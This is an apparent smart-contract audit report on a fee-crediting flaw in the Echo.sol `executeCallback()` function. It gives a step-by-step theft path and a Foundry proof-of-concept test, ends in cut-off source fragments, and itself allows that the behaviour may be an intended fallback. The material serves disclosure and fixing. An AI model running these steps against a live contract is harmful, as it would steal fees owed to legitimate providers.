### Title
Unconstrained `providerToCredit` Parameter Enables Fee Theft After Exclusivity Period - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

In `Echo.sol`, the `executeCallback()` function accepts a caller-controlled `providerToCredit` address. During the exclusivity period the contract correctly enforces that only the assigned provider may be credited. After the exclusivity period expires, **no validation of `providerToCredit` is performed at all**, allowing any attacker who has registered as a provider to redirect the entire request fee to themselves, stealing it from the legitimate provider.

---

### Finding Description

`executeCallback()` credits fees to the caller-supplied `providerToCredit`:

```solidity
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
```

The only guard on `providerToCredit` is the exclusivity-period check:

```solidity
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(
        providerToCredit == req.provider,
        "Only assigned provider during exclusivity period"
    );
}
``` [1](#0-0) 

Once `block.timestamp >= req.publishTime + exclusivityPeriodSeconds`, the check is skipped entirely. The attacker passes their own address as `providerToCredit`, and the full `req.fee` (paid by the original requester) is credited to the attacker's provider account instead of `req.provider`. [2](#0-1) 

The correct fix mirrors the original report's recommendation: the check should always validate that `providerToCredit == req.provider`, or at minimum that `providerToCredit` is the assigned provider regardless of the exclusivity window.

---

### Impact Explanation

**Impact: High.** The attacker steals 100% of the fee (`req.fee`) that the requester paid to the legitimate provider. The legitimate provider (`req.provider`) receives nothing for fulfilling the request. The attacker can drain fees from every request whose exclusivity period has elapsed.

The attacker can withdraw the stolen fees via the following path:

1. Call `registerProvider(0, 0, 0)` — registers attacker as a provider.
2. Call `setFeeManager(attackerAddress)` — sets attacker as their own fee manager.
3. Call `executeCallback(attackerAddress, sequenceNumber, updateData, priceIds)` — credits fees to attacker.
4. Call `withdrawAsFeeManager(attackerAddress, amount)` — withdraws stolen funds. [3](#0-2) 

---

### Likelihood Explanation

**Likelihood: High.** Any unprivileged address can register as a provider (permissionless). The attacker only needs to wait for the exclusivity period to expire — a publicly observable on-chain condition — and then front-run or simply call `executeCallback` first. No privileged access, leaked keys, or external oracle manipulation is required. [4](#0-3) 

---

### Recommendation

After the exclusivity period, `providerToCredit` should still be validated against `req.provider`. The exclusivity period only controls *who may call first*, not *who may be credited*. Apply the following fix:

```diff
-   if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
-       require(
-           providerToCredit == req.provider,
-           "Only assigned provider during exclusivity period"
-       );
-   }
+   require(
+       providerToCredit == req.provider,
+       "providerToCredit must be the assigned provider"
+   );
```

If the intent is to allow a different provider to step in after the exclusivity period (as a fallback), then `providerToCredit` must still be restricted to registered providers and the fee split logic must be explicitly defined, not left open to arbitrary addresses.

### Proof of Concept

```solidity
function testFeeTheftAfterExclusivity() public {
    address victim   = address(0xABCD);
    address attacker = address(0x1337);
    address legitProvider = address(0xBEEF);

    // Legitimate provider registers
    vm.prank(legitProvider);
    echo.registerProvider(0, 0, 1); // feePerGasInWei = 1

    // Victim requests a price update, paying the fee
    vm.deal(victim, 1 ether);
    vm.prank(victim);
    uint64 seqNum = echo.requestPriceUpdatesWithCallback{value: 1 ether}(
        legitProvider, block.timestamp, priceIds, 100_000
    );

    // Attacker registers as a provider and sets themselves as fee manager
    vm.prank(attacker);
    echo.registerProvider(0, 0, 0);
    vm.prank(attacker);
    echo.setFeeManager(attacker);

    // Exclusivity period expires
    vm.warp(block.timestamp + exclusivityPeriod + 1);

    // Attacker calls executeCallback crediting themselves
    vm.prank(attacker);
    echo.executeCallback(attacker, seqNum, updateData, priceIds);

    // Attacker withdraws stolen fees
    uint128 stolen = echo.getProviderInfo(attacker).accruedFeesInWei;
    vm.prank(attacker);
    echo.withdrawAsFeeManager(attacker, stolen);

    // Legitimate provider received nothing
    assertEq(echo.getProviderInfo(legitProvider).accruedFeesInWei, 0);
}

        address providerToCredit,
        uint64 sequenceNumber,
        bytes[] calldata updateData,

        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }

        // Verify priceIds match
        require(

            // Extract first 8 bytes of the provided price ID
            bytes32 priceId = priceIds[i];

            if (prefix != req.priceIdPrefixes[i]) {

    function withdrawAsFeeManager(
        address provider,
        uint128 amount
    ) external override {
        require(
            msg.sender == _state.providers[provider].feeManager,
            "Only fee manager"
        );
        require(
            _state.providers[provider].accruedFeesInWei >= amount,
            "Insufficient balance"
        );

        _state.providers[provider].accruedFeesInWei -= amount;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send fees");

        emit FeesWithdrawn(msg.sender, amount);
